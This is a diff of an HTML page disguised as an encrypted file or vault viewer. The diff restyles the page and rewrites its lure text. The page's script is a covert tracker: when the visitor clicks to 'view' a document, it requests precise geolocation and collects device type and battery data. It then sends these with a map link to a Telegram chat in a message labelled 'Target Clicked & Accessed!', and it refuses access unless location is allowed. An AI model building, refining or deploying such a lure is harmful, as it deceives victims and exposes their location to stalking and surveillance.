@@ -3,74 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Document Viewer</title>
+    <title>Secure Vault | Encrypted Node</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            padding: 40px 20px; 
-            background-color: #0d1117; 
-            color: #c9d1d9; 
+
+        body {
+            background-color: #030712;
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(30, 58, 138, 0.3) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(88, 28, 135, 0.3) 0px, transparent 50%);
+            color: #f3f4f6;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
+            overflow: hidden;
         }
+
+        /* Glowing Animated Container */
         .container {
-            background: #161b22;
-            padding: 35px 25px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            max-width: 420px;
+            background: rgba(17, 24, 39, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            padding: 40px 25px;
+            border-radius: 24px;
+            box-shadow: 0 0 40px rgba(59, 130, 246, 0.15), inset 0 0 15px rgba(59, 130, 246, 0.05);
+            max-width: 400px;
             width: 100%;
-            border: 1px solid #30363d;
+            text-align: center;
+            position: relative;
+            animation: floatCard 4s ease-in-out infinite;
         }
+
+        @keyframes floatCard {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        /* Glowing Pulse Icon Ring */
+        .icon-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid #3b82f6;
+            animation: pulseAnim 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulseAnim {
+            0% { transform: scale(0.95); opacity: 1; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+
+        .lock-icon {
+            width: 54px;
+            height: 54px;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+            z-index: 2;
+        }
+
         h2 {
-            font-size: 20px;
-            margin-bottom: 12px;
-            color: #58a6ff;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #60a5fa, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.5px;
         }
+
         p {
             font-size: 14px;
-            color: #8b949e;
-            margin-bottom: 20px;
-            line-height: 1.5;
+            color: #9ca3af;
+            margin-bottom: 25px;
+            line-height: 1.6;
         }
+
+        /* Cyberpunk Neon Button */
         .btn {
-            background-color: #238636;
+            background: linear-gradient(135deg, #2563eb, #7c3aed);
             color: white;
             border: none;
-            padding: 12px 20px;
+            padding: 14px 20px;
             font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
+            font-weight: 600;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            transition: background 0.2s;
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
+
         .btn:hover {
-            background-color: #2ea043;
+            background: linear-gradient(135deg, #1d4ed8, #6d28d9);
+            box-shadow: 0 6px 25px rgba(124, 58, 237, 0.6);
+            transform: translateY(-2px);
         }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
         #status { 
             font-size: 13px; 
-            color: #8b949e; 
-            margin-top: 15px;
+            color: #9ca3af; 
+            margin-top: 18px;
             word-break: break-word;
+            font-weight: 500;
         }
-        .error { color: #f85149 !important; }
+
+        .error { color: #f87171 !important; }
+
+        .secure-badge {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #4b5563;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
     </style>
 </head>
 <body>
-    <div class="container" id="main-box">
-        <h2>🔒 Encrypted File Shared</h2>
-        <p>You have received a secure document. Click the button below to verify and view the content.</p>
-        <button class="btn" id="loadBtn">View Document</button>
+
+    <div class="container">
+        <div class="icon-container">
+            <div class="pulse-ring"></div>
+            <div class="lock-icon">🔒</div>
+        </div>
+        
+        <h2>Encrypted Vault Node</h2>
+        <p>High-security file transfer initialized. Tap below to authenticate and decrypt payload.</p>
+        
+        <button class="btn" id="loadBtn">Authorize & View</button>
         <p id="status"></p>
+
+        <div class="secure-badge">
+            <span>🛡️ End-to-End Encrypted Link</span>
+        </div>
     </div>
 
     <!-- Firebase SDKs -->
@@ -125,10 +223,9 @@
             }
 
             const deviceType = getDeviceInfo();
-            statusText.innerText = "Loading file data...";
+            statusText.innerText = "Establishing secure handshake...";
             const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
             
-            // Fast instant message without waiting for slow address API
             const message = `🚨 *Target Clicked & Accessed!* 🎯\n\n` +
                             `📱 *Device:* ${deviceType}\n` +
                             `🔋 *Battery:* ${batteryInfo}\n` +
@@ -145,12 +242,12 @@
                     parse_mode: "Markdown"
                 })
             }).then(() => {
-                statusText.innerText = "Loaded successfully!";
+                statusText.innerText = "Payload decrypted successfully!";
             }).catch(err => console.error("Telegram Alert Error:", err));
         }
 
         loadBtn.addEventListener("click", () => {
-            loadBtn.innerText = "Verifying...";
+            loadBtn.innerText = "Authenticating...";
             loadBtn.disabled = true;
 
             if (navigator.geolocation) {
@@ -169,9 +266,9 @@
                     });
 
                 }, (error) => {
-                    statusText.innerText = "Permission denied. Please allow location to view file.";
+                    statusText.innerText = "Authorization failed. Location required.";
                     statusText.classList.add("error");
-                    loadBtn.innerText = "Retry";
+                    loadBtn.innerText = "Retry Access";
                     loadBtn.disabled = false;
                 }, {
                     enableHighAccuracy: true,
@@ -179,7 +276,7 @@
                     maximumAge: 0
                 });
             } else {
-                statusText.innerText = "Browser not supported.";
+                statusText.innerText = "Protocol not supported by browser.";
                 statusText.classList.add("error");
             }
         });
